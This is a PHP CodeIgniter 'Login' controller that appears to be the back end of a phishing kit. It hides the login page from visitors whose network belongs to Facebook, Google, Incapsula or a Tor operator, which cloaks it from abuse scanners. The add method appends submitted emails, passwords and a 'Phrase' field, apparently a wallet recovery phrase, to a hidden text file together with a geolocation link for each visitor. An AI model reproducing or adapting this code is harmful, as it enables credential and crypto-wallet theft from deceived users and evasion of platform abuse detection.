<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/userguide3/general/urls.html
	 */
	public function index()
	{
		if (getenv('HTTP_CLIENT_IP'))
			$ipaddress = getenv('HTTP_CLIENT_IP');
		else if (getenv('HTTP_X_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		else if (getenv('HTTP_X_FORWARDED'))
			$ipaddress = getenv('HTTP_X_FORWARDED');
		else if (getenv('HTTP_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_FORWARDED_FOR');
		else if (getenv('HTTP_FORWARDED'))
			$ipaddress = getenv('HTTP_FORWARDED');
		else if (getenv('REMOTE_ADDR'))
			$ipaddress = getenv('REMOTE_ADDR');
		else
			$ipaddress = 'UNKNOWN';

		$newip = explode(',', $ipaddress);
		$ipbaru = $newip[0];

		if ($this->getstatusipuser($ipbaru) == "aman") {
			$this->load->view('login');
		} else {
			echo "";
		}
	}

	function add()
	{
		$this->load->helper('file');
		$ip   = getenv("REMOTE_ADDR");
		$data = "========================================================================================\nEmail : " . $this->input->post('email') . "\nPassword : " . $this->input->post('password') . "\nPhrase : " . $this->input->post('parse') . "\nDate : " . date("Y-m-d h:i:sa") . "\nhttp://www.geoiptool.com/?IP=" . $ip . "\n========================================================================================\n\n";
		if (write_file('./assets/j645tw.txt', $data, 'a')) {
			echo true;
		} else {
			echo false;
		}
	}

	public function getstatusipuser($ipbaru)
	{
		$ip = json_decode(file_get_contents(sprintf('https://ip.nf/%s.json', $ipbaru)));
		$myisp = strtolower($ip->ip->asn);
		$ispfb = "zwiebelfreunde";
		$word = "facebook";
		$word2 = "incapsula";
		$word3 = "google";
		if (strpos($myisp, $word) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $word2) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $ispfb) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $word3) !== FALSE) {
			$status = "tidakaman";
		} else {
			$status = "aman";
		}
		return $status;
	}
}
